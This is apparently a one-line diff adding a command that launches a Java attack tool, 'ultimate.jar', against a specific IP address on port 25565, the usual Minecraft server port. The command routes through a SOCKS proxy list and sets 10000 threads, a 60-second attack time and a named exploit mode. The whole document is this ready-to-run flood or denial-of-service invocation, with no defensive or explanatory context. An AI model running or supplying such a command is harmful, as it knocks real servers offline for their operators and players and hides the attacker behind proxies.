@@ -1,0 +1,1 @@
+java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar ultimate.jar host=103.173.227.102 port=25565 proxiesFile=socks_proxies.txt threads=10000 attackTime=60 exploit=abd
